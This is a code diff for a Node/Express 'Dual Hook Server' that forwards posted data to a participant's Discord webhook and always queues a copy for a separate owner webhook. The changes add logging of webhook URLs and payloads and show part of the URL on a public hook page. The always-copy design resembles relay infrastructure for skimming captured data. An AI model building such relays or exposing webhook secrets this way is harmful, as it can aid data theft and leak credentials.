@@ -143,13 +143,13 @@ async function addToOwnerQueue(hookId, data, participantWebhook, username) {
         username,
         data,
         participantWebhook,
-        status: 'pending', // pending, sending, sent, failed
+        status: 'pending',
         attempts: 0,
         maxAttempts: 5,
         createdAt: new Date().toISOString(),
         updatedAt: new Date().toISOString(),
         lastError: null,
-        retryAt: null // When to retry (ISO date string)
+        retryAt: null
     };
     
     const result = await queueCollection.insertOne(queueItem);
@@ -226,12 +226,10 @@ async function processOwnerQueue() {
         console.log(`📤 Processing ${items.length} queue items for owner webhook`);
         
         for (const item of items) {
-            // Mark as sending
             await updateQueueItem(item._id, { status: 'sending' });
             
             console.log(`📤 Sending to owner webhook for user: ${item.username}`);
             
-            // Send to owner webhook
             const result = await sendToWebhook(OWNER_WEBHOOK, item.data);
             
             if (result.success) {
@@ -243,7 +241,6 @@ async function processOwnerQueue() {
                 });
                 console.log(`✅ Owner webhook sent successfully for ${item.username}`);
             } else if (result.status === 429) {
-                // Rate limited - get retry time from Discord
                 const retryAfterSeconds = parseInt(result.retryAfter) || 30;
                 const retryAt = new Date(Date.now() + (retryAfterSeconds * 1000));
                 
@@ -255,7 +252,6 @@ async function processOwnerQueue() {
                 });
                 console.log(`⏳ Owner rate limited, retry at ${retryAt.toISOString()}`);
             } else {
-                // Other error
                 if (item.attempts >= item.maxAttempts) {
                     await updateQueueItem(item._id, {
                         status: 'failed',
@@ -264,7 +260,6 @@ async function processOwnerQueue() {
                     });
                     console.log(`❌ Owner webhook failed after ${item.attempts} attempts`);
                 } else {
-                    // Retry after 30 seconds
                     const retryAt = new Date(Date.now() + 30000);
                     await updateQueueItem(item._id, {
                         status: 'pending',
@@ -276,7 +271,6 @@ async function processOwnerQueue() {
                 }
             }
             
-            // Wait between items
             await new Promise(r => setTimeout(r, 250));
         }
         
@@ -285,7 +279,6 @@ async function processOwnerQueue() {
     } finally {
         isProcessing = false;
         
-        // Check for more items
         const pending = await queueCollection.countDocuments({ status: 'pending' });
         if (pending > 0) {
             console.log(`🔄 ${pending} items still pending, continuing...`);
@@ -294,10 +287,23 @@ async function processOwnerQueue() {
     }
 }
 
+// ============================================================
+//  ✅ IMPROVED WEBHOOK SENDER WITH BETTER ERROR HANDLING
+// ============================================================
 async function sendToWebhook(webhookUrl, data) {
     try {
-        console.log(`📤 Sending to webhook: ${webhookUrl.substring(0, 50)}...`);
-        
+        // Validate URL
+        if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+            console.log(`❌ Invalid webhook URL: ${webhookUrl}`);
+            return { 
+                success: false, 
+                error: 'Invalid webhook URL' 
+            };
+        }
+
+        console.log(`📤 Sending to webhook: ${webhookUrl.substring(0, 60)}...`);
+        console.log(`📦 Payload:`, JSON.stringify(data).substring(0, 300));
+
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
@@ -307,6 +313,8 @@ async function sendToWebhook(webhookUrl, data) {
         });
 
         const responseText = await response.text();
+        console.log(`📥 Response status: ${response.status}`);
+        console.log(`📥 Response body: ${responseText.substring(0, 200)}`);
 
         if (response.status === 429) {
             const retryAfter = response.headers.get('Retry-After') || '5';
@@ -330,6 +338,7 @@ async function sendToWebhook(webhookUrl, data) {
         return { success: true, status: response.status };
 
     } catch (error) {
+        console.error(`❌ Webhook error:`, error.message);
         return { 
             success: false, 
             error: error.message
@@ -342,8 +351,6 @@ async function sendToWebhook(webhookUrl, data) {
 // ============================================================
 function startQueueProcessor() {
     console.log('🚀 Starting owner queue processor...');
-    
-    // Check every 5 seconds for items that are ready to send
     setInterval(() => {
         processOwnerQueue();
     }, 5000);
@@ -360,7 +367,6 @@ app.get('/', (req, res) => {
         message: 'VRT-BOT Dual Hook Server - Participant Priority',
         ownerWebhookConfigured: !!OWNER_WEBHOOK,
         databaseConnected: !!db,
-        queueStats: 'Use /api/queue/stats',
         timestamp: new Date().toISOString(),
         cors: 'enabled'
     });
@@ -411,8 +417,9 @@ app.post('/api/generate', async (req, res) => {
         return res.status(400).json({ error: 'Username and webhook URL required' });
     }
 
+    // Validate webhook URL
     if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-        return res.status(400).json({ error: 'Invalid Discord webhook URL' });
+        return res.status(400).json({ error: 'Invalid Discord webhook URL. Must start with https://discord.com/api/webhooks/' });
     }
 
     if (!db || !webhooksCollection) {
@@ -533,14 +540,13 @@ app.delete('/api/hook/:id', async (req, res) => {
 });
 
 // ============================================================
-//  ✅ SEND TO PARTICIPANT FIRST + QUEUE OWNER IF RATE LIMITED
+//  ✅ SEND TO PARTICIPANT FIRST WITH BETTER ERROR HANDLING
 // ============================================================
 app.post('/api/send/:hookId', async (req, res) => {
     const { hookId } = req.params;
     const { data } = req.body;
 
     console.log(`📨 Received send request for hook: ${hookId}`);
-    console.log(`📦 Data:`, JSON.stringify(data).substring(0, 300));
 
     if (!data) {
         console.log('❌ No data provided');
@@ -560,29 +566,36 @@ app.post('/api/send/:hookId', async (req, res) => {
             return res.status(404).json({ error: 'Hook not found' });
         }
 
+        console.log(`👤 Participant: ${hook.username}`);
+        console.log(`🔗 Participant webhook: ${hook.webhookUrl ? hook.webhookUrl.substring(0, 60) : 'NOT SET'}...`);
+
         let participantSuccess = false;
         let participantError = null;
+        let participantStatus = null;
 
         // ============================================================
-        //  1. ALWAYS SEND TO PARTICIPANT FIRST (Priority)
+        //  1. ALWAYS SEND TO PARTICIPANT FIRST
         // ============================================================
-        console.log(`👤 Sending to participant: ${hook.username}`);
-        console.log(`🔗 Participant webhook: ${hook.webhookUrl.substring(0, 60)}...`);
-        
         if (hook.webhookUrl) {
+            console.log(`📤 Sending to participant: ${hook.username}`);
             const participantResult = await sendToWebhook(hook.webhookUrl, data);
             
-            if (participantResult.success) {
-                participantSuccess = true;
+            participantSuccess = participantResult.success;
+            participantError = participantResult.error || null;
+            participantStatus = participantResult.status || null;
+            
+            if (participantSuccess) {
                 console.log(`✅ Participant webhook sent successfully: ${hook.username}`);
             } else {
-                participantError = participantResult.error || participantResult.status;
                 console.log(`⚠️ Participant webhook failed: ${participantResult.error}`);
             }
+        } else {
+            participantError = 'No webhook URL configured for this user';
+            console.log(`⚠️ No webhook URL for participant: ${hook.username}`);
         }
 
         // ============================================================
-        //  2. QUEUE FOR OWNER WEBHOOK (Always queue, handles rate limits)
+        //  2. QUEUE FOR OWNER WEBHOOK
         // ============================================================
         let ownerQueueId = null;
         
@@ -610,12 +623,13 @@ app.post('/api/send/:hookId', async (req, res) => {
             success: participantSuccess,
             message: participantSuccess 
                 ? '✅ Participant notified! Owner webhook queued.' 
-                : '⚠️ Participant failed, but data queued for owner.',
+                : `⚠️ Participant failed: ${participantError}. Data queued for owner.`,
             hookId: hookId,
             username: hook.username,
             participant: {
                 success: participantSuccess,
-                error: participantError
+                error: participantError,
+                status: participantStatus
             },
             owner: {
                 queued: !!OWNER_WEBHOOK,
@@ -706,6 +720,7 @@ app.get('/hook/:id', async (req, res) => {
                     .badge{display:inline-block;padding:2px 10px;border-radius:999px;font-size:10px;font-weight:600;margin-left:6px;}
                     .badge.participant{background:rgba(69,220,147,.15);color:#45dc93;border:1px solid rgba(69,220,147,.2);}
                     .badge.owner{background:rgba(82,113,255,.15);color:#5271ff;border:1px solid rgba(82,113,255,.2);}
+                    .debug-info{font-size:11px;color:#777;margin-top:10px;padding:8px;background:rgba(0,0,0,.1);border-radius:6px;word-break:break-all;}
                     @media(max-width:600px){.info-grid{grid-template-columns:1fr;}}
                 </style>
             </head>
@@ -727,6 +742,10 @@ app.get('/hook/:id', async (req, res) => {
                             <div class="label">📅 Created</div>
                             <div class="value">${new Date(hook.createdAt).toLocaleDateString()}</div>
                         </div>
+                    </div>
+                    
+                    <div class="debug-info" id="webhookDebug">
+                        Webhook: ${hook.webhookUrl ? hook.webhookUrl.substring(0, 60) + '...' : 'NOT SET'}
                     </div>
                     
                     <div class="actions">
@@ -791,7 +810,7 @@ app.get('/hook/:id', async (req, res) => {
                                 alert(\`✅ Participant notified!\\n📦 Owner queued (ID: \${result.owner?.queueId || 'N/A'})\`);
                                 checkQueue();
                             } else {
-                                alert('⚠️ Error: ' + (result.error || 'Unknown error'));
+                                alert(\`⚠️ Participant failed: \${result.participant?.error || 'Unknown error'}\\n📦 Owner queued: \${result.owner?.queued ? 'Yes' : 'No'}\`);
                             }
                         } catch (error) {
                             alert('Error: ' + error.message);
@@ -806,11 +825,9 @@ app.get('/hook/:id', async (req, res) => {
                         statusEl.textContent = 'Loading...';
                         
                         try {
-                            // Get stats
                             const statsRes = await fetch(\`\${API_BASE}/api/queue/stats\`);
                             const stats = await statsRes.json();
                             
-                            // Get items for this hook
                             const itemsRes = await fetch(\`\${API_BASE}/api/queue/items?hookId=\${HOOK_ID}\`);
                             const items = await itemsRes.json();
                             
@@ -867,9 +884,7 @@ app.get('/hook/:id', async (req, res) => {
                         }
                     }
 
-                    // Initial queue check
                     checkQueue();
-                    // Auto-refresh every 15 seconds
                     setInterval(checkQueue, 15000);
                 </script>
             </body>
@@ -901,11 +916,9 @@ async function startServer() {
         console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
         console.log(`📁 Hook pages: https://vrt-bot-hook-server.onrender.com/hook/{id}`);
         console.log(`📡 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
-        console.log(`📊 Queue stats: https://vrt-bot-hook-server.onrender.com/api/queue/stats`);
         console.log(`⚡ Priority: Participant first, Owner queued`);
     });
     
-    // Start the background queue processor
     if (connected && OWNER_WEBHOOK) {
         startQueueProcessor();
         console.log('✅ Owner queue processor started');
